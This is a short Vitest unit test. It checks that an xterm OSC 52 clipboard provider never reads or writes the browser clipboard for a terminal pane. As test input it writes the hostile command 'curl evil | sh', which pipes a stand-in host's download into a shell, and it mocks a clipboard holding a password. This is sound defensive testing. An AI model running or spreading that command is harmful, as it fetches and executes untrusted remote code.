import { afterEach, describe, expect, it, vi } from 'vitest'
import type { ClipboardSelectionType } from '@xterm/addon-clipboard'
import { osc52ClipboardProvider } from './terminalClipboard'

describe('osc52ClipboardProvider', () => {
  afterEach(() => vi.unstubAllGlobals())

  it('never reads nor writes the browser clipboard for a pane', async () => {
    const clipboard = { readText: vi.fn().mockResolvedValue('mot-de-passe'), writeText: vi.fn().mockResolvedValue(undefined) }
    vi.stubGlobal('navigator', { clipboard })
    for (const selection of ['c', 'p'] as unknown as ClipboardSelectionType[]) {
      await expect(osc52ClipboardProvider.readText(selection)).resolves.toBe('')
      await osc52ClipboardProvider.writeText(selection, 'curl evil | sh')
    }
    expect(clipboard.readText).not.toHaveBeenCalled()
    expect(clipboard.writeText).not.toHaveBeenCalled()
  })
})
